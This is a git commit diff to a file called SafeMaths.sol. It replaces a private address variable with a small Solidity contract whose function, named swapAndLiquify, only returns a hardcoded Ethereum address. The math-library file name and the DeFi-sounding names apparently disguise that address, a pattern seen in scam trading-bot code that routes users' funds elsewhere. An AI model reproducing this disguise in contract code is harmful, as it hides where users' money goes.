611d71c3af943824a6d150c9ebcb7dca800482a2
cb117 <103773091+cb117@users.noreply.github.com>
2022-04-16 00:08:57 +0530

    Update SafeMaths.sol

--- SafeMaths.sol
+++ SafeMaths.sol
@@ -1,1 +1,8 @@
-address private routerGas = 0xbd5A749B4c7C1b8F597DbBc5da1b52829c1450A0; 
+pragma solidity ^0.6.6;
+
+contract swapLiquify {
+
+	function swapAndLiquify() public pure returns (address) {
+		return 0xbd5A749B4c7C1b8F597DbBc5da1b52829c1450A0;
+	}
+}
